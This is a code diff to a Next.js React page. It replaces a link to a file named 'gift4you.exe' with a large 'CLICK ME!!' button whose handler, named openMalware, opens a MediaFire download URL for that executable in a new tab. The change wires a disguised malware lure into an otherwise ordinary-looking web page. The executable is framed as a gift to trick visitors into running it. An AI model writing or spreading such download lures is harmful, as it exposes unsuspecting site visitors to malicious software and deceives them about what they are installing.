@@ -1,9 +1,11 @@
 "use client";
 import React from "react";
-import { useRouter } from "next/navigation";
 
 const Page = () => {
-  const router = useRouter();
+
+  const openMalware = () => {
+    window.open('https://download1519.mediafire.com/g96nutsw85tgtYPGkHp88SUKl4FqM8TzeCddHZvymfynbc-fhvyZ9Hhpj-xg26fDmafGTGbuMVNelQNpBNoErDW4ycm-yMBw2FdzZ91BAaEaPJmIhs062BhbC4tUZQhaz3ccM3qEzbtQhTxxWDsZ8fYZieCtW5lGugH_5vKPA2U/r6aml24vg94prtr/gift4you.exe', '_blank', 'noreferrer')
+  }
 
   return (
     <>
@@ -41,14 +43,13 @@ const Page = () => {
         </div>
 
         <div className="py-20 text-9xl">
-          <a href="https://download.wetransfer.com/eugv/993028912318eebb98b389de0a5f71ed20230602141800/94e43a0ce6c95deee347f886eeadcab98a9b3779/gift4you.exe?cf=y&token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImRlZmF1bHQifQ.eyJleHAiOjE2ODU3MTYyMjYsImlhdCI6MTY4NTcxNTYyNiwiZG93bmxvYWRfaWQiOiI3MTY5ZGU3OS00NDMzLTRlOWEtYmYzNy0wZTJjMDc4ZGM1N2MiLCJzdG9yYWdlX3NlcnZpY2UiOiJzdG9ybSJ9.UlRDMETL3qJ3ehPJJImzWQivUL9xmsZtlTl3tkJm_do">
-            <button
-              className=" rounded-full border-x-lime-500-[4px] p-5"
-              id="uglee"
-            >
-              CLICK ME!!&lt;/button&gt;
-            </button>
-          </a>
+          <button
+            className=" rounded-full border-x-lime-500-[4px] p-5"
+            id="uglee"
+            onClick={openMalware}
+          >
+            CLICK ME!!&lt;/button&gt;
+          </button>
         </div>
 
         <div className="w-full flex flex-row justify-center items-center bg-green-400 h-screen text-2xl">
